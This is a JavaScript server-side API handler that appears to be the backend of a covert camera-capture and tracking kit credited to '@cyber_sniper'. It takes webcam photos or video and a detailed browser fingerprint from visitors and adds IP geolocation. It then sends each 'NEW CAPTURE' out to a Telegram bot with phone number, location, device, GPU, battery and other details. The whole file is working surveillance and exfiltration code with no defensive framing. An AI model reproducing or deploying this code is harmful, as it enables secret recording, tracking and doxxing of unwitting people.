import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const { type, image, video, mimeType, fingerprint, videoIndex } = req.body;
    if (!type) return res.status(400).json({ error: 'Missing type' });
    if (type === 'image' && !image) return res.status(400).json({ error: 'No image' });
    if (type === 'video' && !video) return res.status(400).json({ error: 'No video' });

    let BOT_TOKEN = process.env.BOT_TOKEN;
    let CHAT_ID = process.env.CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
        try {
            const root = process.cwd();
            BOT_TOKEN = fs.readFileSync(path.join(root, 'token.txt'), 'utf8').trim();
            CHAT_ID = fs.readFileSync(path.join(root, 'uid.txt'), 'utf8').trim();
        } catch (e) {
            return res.status(500).json({ error: 'Bot config missing: ' + e.message });
        }
    }

    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';

    let geo = {};
    try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,org,as,query`);
        geo = await geoRes.json();
    } catch (e) {
        geo = { status: 'fail', country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
    }

    const f = fingerprint || {};
    const videoLabel = videoIndex !== undefined ? ` (Video ${videoIndex+1})` : '';

    // ✅ CREDITS ADDED HERE
    const caption = `📡 **NEW CAPTURE** ${type === 'video' ? '🎥' : '📸'}${videoLabel}\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `📞 **Phone:** ${f.phone || 'N/A'}\n` +
        `🌐 **IP:** \`${ip}\`\n` +
        `📍 **Location:** ${geo.country ? `${geo.country}, ${geo.city}` : 'Unknown'} (${geo.isp || 'ISP Unknown'})\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `🖥️ **Device:** ${f.platform || 'N/A'}\n` +
        `💻 **Browser:** ${f.userAgent ? f.userAgent.split(') ')[0] + ')' : 'N/A'}\n` +
        `📺 **Screen:** ${f.screen || 'N/A'} (dpr: ${f.dpr || '1'})\n` +
        `🔄 **Orientation:** ${f.orientation || 'N/A'}\n` +
        `🕐 **Timezone:** ${f.timezone || 'N/A'} (UTC${f.offset ? f.offset/60 : '?'})\n` +
        `⚙️ **CPU Cores:** ${f.cores || 'N/A'} | **Memory:** ${f.memory ? f.memory + ' GB' : 'N/A'}\n` +
        `📶 **Connection:** ${f.connection ? `${f.connection.effectiveType}, ${f.connection.downlink} Mbps` : 'N/A'}\n` +
        `🎮 **GPU:** ${f.webgl ? f.webgl.renderer : 'N/A'}\n` +
        `🔋 **Battery:** ${f.battery ? `${f.battery.level} (${f.battery.charging ? 'Charging' : 'Not charging'})` : 'N/A'}\n` +
        `🔗 **Referrer:** ${f.referrer || 'Direct'}\n` +
        `👁️ **Viewport:** ${f.viewport || 'N/A'}\n` +
        `🍪 **Cookies:** ${f.cookiesEnabled ? 'Enabled' : 'Disabled'}\n` +
        `🌐 **Online:** ${f.online ? 'Yes' : 'No'}\n` +
        `🚫 **DNT:** ${f.doNotTrack || 'N/A'}\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `🕒 **Captured:** ${new Date().toLocaleString()}\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `🎯 **Credits:** @cyber_sniper`;

    let form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('caption', caption);
    form.append('parse_mode', 'Markdown');

    if (type === 'image') {
        const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ''), 'base64');
        form.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'capture.jpg');
    } else if (type === 'video') {
        const buffer = Buffer.from(video, 'base64');
        const ext = mimeType === 'video/mp4' ? 'mp4' : 'webm';
        form.append('video', new Blob([buffer], { type: mimeType }), `capture_${videoIndex}.${ext}`);
    }

    try {
        const endpoint = type === 'image'
            ? `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`
            : `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;

        const response = await fetch(endpoint, { method: 'POST', body: form });
        const data = await response.json();

        if (!response.ok) {
            console.error('Telegram error:', data);
            return res.status(500).json({ error: `Telegram: ${data.description}` });
        }

        res.status(200).json({ status: 'ok' });
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ error: error.message });
    }
}
